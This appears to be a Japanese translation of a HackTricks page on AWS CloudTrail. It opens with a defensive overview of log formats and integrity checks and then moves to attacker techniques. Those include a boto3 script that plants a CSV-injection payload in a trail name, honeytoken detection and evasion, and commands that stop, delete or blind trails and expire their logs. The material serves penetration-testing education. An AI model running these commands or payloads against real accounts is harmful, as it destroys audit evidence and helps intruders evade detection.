# AWS - CloudTrail Enum

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **CloudTrail**

AWS CloudTrail **は、AWS環境内のアクティビティを記録および監視します**。詳細な**イベントログ**をキャプチャし、誰が何を、いつ、どこから行ったかを含む、AWSリソースとのすべてのやり取りを記録します。これにより、セキュリティ分析、コンプライアンス監査、およびリソース変更追跡に役立つ監査証跡が提供されます。CloudTrailは、ユーザーおよびリソースの行動を理解し、セキュリティ態勢を強化し、規制遵守を確保するために不可欠です。

各ログイベントには以下が含まれます：

* 呼び出されたAPIの名前: `eventName`
* 呼び出されたサービス: `eventSource`
* 時間: `eventTime`
* IPアドレス: `SourceIPAddress`
* エージェントメソッド: `userAgent`. 例:
* Signing.amazonaws.com - AWS Management Consoleから
* console.amazonaws.com - アカウントのルートユーザー
* lambda.amazonaws.com - AWS Lambda
* リクエストパラメータ: `requestParameters`
* レスポンス要素: `responseElements`

イベントは**約5分ごとに新しいログファイルにJSON形式で書き込まれ**、CloudTrailによって保持され、最終的にログファイルは**約15分後にS3に配信されます**。\
CloudTrailのログは**アカウント間およびリージョン間で集約できます**。\
CloudTrailは**ログファイルの整合性を使用して、CloudTrailが配信した後にログファイルが変更されていないことを確認できるようにします**。ログのSHA-256ハッシュをダイジェストファイル内に作成します。新しいログのSHA-256ハッシュは毎時作成されます。\
Trailを作成する際、イベントセレクターを使用して、管理、データ、またはインサイトイベントをログに記録するようにTrailを指定できます。

ログはS3バケットに保存されます。デフォルトではサーバーサイド暗号化（SSE-S3）が使用されるため、アクセス権を持つ人々のためにAWSがコンテンツを復号化しますが、追加のセキュリティのためにKMSと独自のキーを使用してSSEを使用できます。

ログは**次の名前形式のS3バケットに保存されます**：

* **`BucketName/AWSLogs/AccountID/CloudTrail/RegionName/YYY/MM/DD`**
* BucketNameは次のようになります： **`aws-cloudtrail-logs-<accountid>-<random>`**
* 例： **`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

各フォルダー内の各ログは**次の形式に従った名前を持ちます**： **`AccountID_CloudTrail_RegionName_YYYYMMDDTHHMMZ_Random.json.gz`**

ログファイルの命名規則

![](<../../../../.gitbook/assets/image (122).png>)

さらに、**ファイルの整合性を確認するためのダイジェストファイル**は**同じバケット内**にあります：

![](<../../../../.gitbook/assets/image (195).png>)

### 複数アカウントからのログの集約

* ログファイルを配信するAWSアカウントでTrialを作成します
* CloudTrailのクロスアカウントアクセスを許可し、アクセスが必要な各AWSアカウントを許可するために、宛先S3バケットに権限を適用します
* 他のAWSアカウントで新しいTrailを作成し、ステップ1で作成したバケットを使用するように選択します

ただし、同じS3バケットにすべてのログを保存できる場合でも、複数のアカウントからのCloudTrailログを単一のAWSアカウントに属するCloudWatch Logsに集約することはできません。

{% hint style="danger" %}
アカウントには**異なるバケットに同じ（または異なる）ログを保存する**CloudTrailの**異なるTrails**が有効になっている可能性があることを忘れないでください。
{% endhint %}

### すべての組織アカウントから1つのCloudtrailへ

CloudTrailを作成する際、組織内のすべてのアカウントに対してCloudTrailを有効にし、ログを1つのバケットに集約することが可能です：

<figure><img src="../../../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>

この方法では、すべてのアカウントのすべてのリージョンでCloudTrailを簡単に構成し、1つのアカウントにログを集中させることができます（保護する必要があります）。

### ログファイルの確認

ログが変更されていないことを確認するには、次のコマンドを実行します

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
{% endcode %}

### Logs to CloudWatch

**CloudTrailはログをCloudWatchに自動的に送信し、疑わしい活動が行われたときに警告を設定できます。**\
CloudTrailがログをCloudWatchに送信できるようにするためには、そのアクションを許可する**ロール**を作成する必要があります。可能であれば、これらのアクションを実行するためにAWSのデフォルトロールを使用することをお勧めします。このロールはCloudTrailに以下を許可します：

* CreateLogStream: CloudWatch Logsのログストリームを作成することを許可
* PutLogEvents: CloudTrailログをCloudWatch Logsのログストリームに配信することを許可

### Event History

CloudTrail Event Historyは、記録されたログをテーブルで検査することができます：

![](<../../../../.gitbook/assets/image (89).png>)

### Insights

**CloudTrail Insights**はCloudTrailトレイルからの書き込み管理イベントを自動的に**分析**し、**異常な活動**を**警告**します。例えば、`TerminateInstance`イベントの増加が確立されたベースラインと異なる場合、それがInsightイベントとして表示されます。これらのイベントにより、**異常なAPI活動の発見と対応がこれまで以上に容易になります**。

インサイトはCloudTrailログと同じバケットに保存されます：`BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### Security

| CloudTrail Log File Integrity        | <ul><li>ログが改ざん（変更または削除）されていないかを検証</li><li><p>ダイジェストファイルを使用（各ファイルのハッシュを作成）</p><ul><li>SHA-256ハッシュ</li><li>デジタル署名のためのSHA-256とRSA</li><li>Amazonが所有する秘密鍵</li></ul></li><li>ダイジェストファイルの作成には1時間かかる（毎時行われる）</li></ul> |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Stop unauthorized access             | <ul><li><p>IAMポリシーとS3バケットポリシーを使用</p><ul><li>セキュリティチーム —> 管理者アクセス</li><li>監査人 —> 読み取り専用アクセス</li></ul></li><li>ログを暗号化するためにSSE-S3/SSE-KMSを使用</li></ul>                                                                                                                                        |
| Prevent log files from being deleted | <ul><li>IAMおよびバケットポリシーで削除アクセスを制限</li><li>S3 MFA削除を設定</li><li>Log File Validationで検証</li></ul>                                                                                                                                                                                            |

## Access Advisor

AWS Access Advisorは、過去400日間のAWS **CloudTrailログに依存してインサイトを収集**します。CloudTrailは、AWSアカウントで行われたAWS APIコールおよび関連イベントの履歴をキャプチャします。Access Advisorはこのデータを利用して、**サービスが最後にアクセスされた時期を表示**します。CloudTrailログを分析することで、Access AdvisorはIAMユーザーまたはロールがどのAWSサービスにアクセスしたか、およびそのアクセスがいつ行われたかを判断できます。これにより、AWS管理者は**権限の精査**に関する情報に基づいた決定を下すことができ、長期間アクセスされていないサービスを特定し、実際の使用パターンに基づいて過度に広範な権限を削減することができます。

{% hint style="success" %}
したがって、Access Advisorは**ユーザーに与えられた不要な権限**について通知し、管理者がそれらを削除できるようにします
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

## Actions

### Enumeration
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **CSV Injection**

CloudTrail内でCSVインジェクションを実行することが可能であり、ログがCSV形式でエクスポートされ、Excelで開かれた場合に任意のコードが実行されます。\
次のコードは、ペイロードを含む悪意のあるTrail名を持つログエントリを生成します:
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
CSVインジェクションの詳細については、以下のページを参照してください:

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

この特定の技術についての詳細は、[https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)を参照してください。

## **検出回避**

### HoneyTokens **回避**

Honeyokensは**機密情報の流出を検出するために作成**されます。AWSの場合、**使用が監視されるAWSキー**であり、そのキーで何かがトリガーされると、誰かがそのキーを盗んだことになります。

しかし、[**Canarytokens**](https://canarytokens.org/generate)**、** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**、** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)によって作成されたHoneytokensは、認識可能なアカウント名を使用しているか、すべての顧客に同じAWSアカウントIDを使用しています。したがって、Cloudtrailがログを作成しないようにアカウント名やアカウントIDを取得できれば、**そのキーがHoneytokenかどうかを知ることができます**。

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57)には、キーが[**Canarytokens**](https://canarytokens.org/generate)**、** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**、** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)**に属しているかどうかを検出するためのいくつかのルールがあります:**

* **`canarytokens.org`**がロール名に現れるか、エラーメッセージにアカウントID **`534261010715`**が現れる場合。
* 最近のテストでは、アカウント **`717712589309`**を使用しており、名前に**`canarytokens.com`**文字列が含まれています。
* エラーメッセージのロール名に**`SpaceCrab`**が現れる場合。
* **SpaceSiren**は**uuids**を使用してユーザー名を生成します: `[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* **名前がランダムに生成されたように見える**場合、それがHoneyTokenである可能性が高いです。

#### キーIDからアカウントIDを取得する

**アクセスキー**に**エンコード**された**アカウントID**を[**ここで説明されているように**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489)取得し、Honeytokens AWSアカウントのリストと照合することができます:
```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
[**orginal research**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489)で詳細情報を確認してください。

#### ログを生成しない

最も効果的な技術は実際にはシンプルなものです。見つけたキーを使って、自分の攻撃者アカウント内のサービスにアクセスするだけです。これにより、**CloudTrailは被害者のAWSアカウント内ではなく、あなた自身のAWSアカウント内にログを生成します**。

出力にはアカウントIDとアカウント名を示すエラーが表示されるため、**それがHoneytokenかどうかを確認できます**。

#### ログのないAWSサービス

過去には、**CloudTrailにログを送信しないAWSサービス**がいくつかありました（[リストはこちら](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)）。これらのサービスの一部は、**未承認のユーザー（honeytokenキー）**がアクセスしようとすると、**キーのロールのARN**を含む**エラー**で応答します。

この方法で、**攻撃者はログをトリガーせずにキーのARNを取得できます**。ARNには**AWSアカウントIDと名前**が表示されるため、HoneyTokenの企業アカウントIDと名前を簡単に知ることができ、攻撃者はトークンがHoneyTokenかどうかを識別できます。

![](<../../../../.gitbook/assets/image (93).png>)

{% hint style="danger" %}
CloudTrailログを生成しないことが発見されたすべての公開APIは現在修正されているため、自分で見つける必要があるかもしれません...

詳細情報は[**original research**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/)を確認してください。
{% endhint %}

### サードインフラストラクチャへのアクセス

特定のAWSサービスは、**データベース**や**Kubernetes**クラスター（EKS）などの**インフラストラクチャを生成**します。ユーザーが**これらのサービスに直接話しかける**（例えばKubernetes API）場合、**AWS APIを使用しない**ため、CloudTrailはこの通信を検出できません。

したがって、EKSにアクセスできるユーザーがEKS APIのURLを発見した場合、ローカルでトークンを生成し、**CloudTrailに検出されることなくAPIサービスに直接話しかけることができます**。

詳細情報は以下に：

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### CloudTrail設定の変更

#### トレイルの削除
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### トレイルの停止

```bash
aws cloudtrail stop-logging --name <trail name>
```

トレイルを停止するには、上記のコマンドを使用します。トレイルが停止されると、ログは収集されなくなります。

#### Delete trails

トレイルを削除するには、以下のコマンドを使用します。

```bash
aws cloudtrail delete-trail --name <trail name>
```

トレイルが削除されると、そのトレイルに関連するすべてのログ情報が失われます。
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### マルチリージョンロギングを無効化する

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
{% endcode %}

#### イベントセレクタによるログの無効化

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

最初の例では、単一のイベントセレクタが単一のオブジェクトを持つJSON配列として提供されています。`"ReadWriteType": "ReadOnly"`は、**イベントセレクタが読み取り専用のイベントのみをキャプチャする**ことを示しています（例えば、CloudTrail insightsは**書き込みイベントをチェックしません**）。

特定の要件に基づいてイベントセレクタをカスタマイズできます。

#### S3ライフサイクルポリシーによるログ削除

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### バケット構成の変更

* S3バケットを削除する
* CloudTrailサービスからの書き込みを拒否するようにバケットポリシーを変更する
* オブジェクトを削除するためのライフサイクルポリシーをS3バケットに追加する
* CloudTrailログを暗号化するために使用されるkmsキーを無効にする

### Cloudtrailランサムウェア

#### S3ランサムウェア

**非対称キーを生成**し、そのキーで**CloudTrailがデータを暗号化**するようにし、**秘密鍵を削除**することで、CloudTrailの内容を復元できないようにすることができます。\
これは基本的に以下で説明されている**S3-KMSランサムウェア**です：

{% content-ref url="../../aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**KMSランサムウェア**

これは、異なる権限要件で前述の攻撃を実行する最も簡単な方法です：

{% content-ref url="../../aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **参考文献**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

{% hint style="success" %}
AWSハッキングを学び、練習する:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCPハッキングを学び、練習する: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)をフォローしてください。
* **ハッキングトリックを共有するには、** [**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出してください。

</details>
{% endhint %}
